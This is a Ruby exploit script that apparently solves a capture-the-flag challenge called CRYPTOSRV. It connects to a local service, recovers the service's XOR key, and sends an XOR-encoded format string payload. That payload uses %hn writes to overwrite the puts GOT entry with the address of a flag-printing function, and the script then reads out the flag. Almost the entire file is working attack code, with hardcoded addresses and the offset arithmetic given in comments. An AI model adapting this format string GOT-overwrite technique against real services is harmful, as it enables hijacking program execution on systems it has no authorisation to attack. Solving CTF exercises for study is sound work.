#!/usr/bin/env ruby

# CRYPTOSRV solution: Exploit format string vulnerability

require 'socket'

IP = '127.0.0.1'
PORT = 6868

# Xor string with key
def xor_string key, str
	arr = str.unpack("C*").each_with_index.map do |ch, i| ch^(key[i%key.length]) end
	arr.pack("C*")
end

TCPSocket.open IP, PORT do |s|
	# Read Service banner + prompt
	6.times { s.gets }

	# Send known chrs
	s.print [32].pack("L")	
	s.print "\x00" * 32

	#Â Calc XOR key
	sz = s.read(4).unpack("L")[0]
	key = s.read(sz).unpack("C*")
	puts "key = #{key}"
	
	# Read "Message successfully encrypted." + DEBUG
	loop do
		line = s.gets
		break if line.match /Message successfully encrypted/
	end

	# Test: Send known string xored with the srv key
	msg = xor_string(key, "AAAABBBBCCCC")
	s.print [msg.length].pack("L")
	s.print msg
	sz = s.read(4).unpack("L")[0]
	resp = s.read(sz).unpack("A*")[0]
	puts "resp = #{resp}"

	# Read "Message successfully encrypted." + DEBUG
	loop do
		line = s.gets
		puts line
		break if line.match /Message successfully encrypted/
	end

	# Send Payload
	# [DEBUG] puts@GOT=0x804a3b8 ; cat_flag=0x804885b
	# 0x0804 - 8 = 2044
	# 0x885b - (2044 + 8) = 32855
	payload = xor_string(key, "\xba\xa3\x04\x08\xb8\xa3\x04\x08%2044hu%18$hn%32855hu%19$hn");
	s.print [payload.length].pack("L")
	s.print payload
	sz = s.read(4).unpack("L")[0]
	resp = s.read(sz).unpack("A*")[0]

	# Read all
	loop do
		line = s.gets
		if line.match /NcN/
			puts line
			break
		end
	end
end
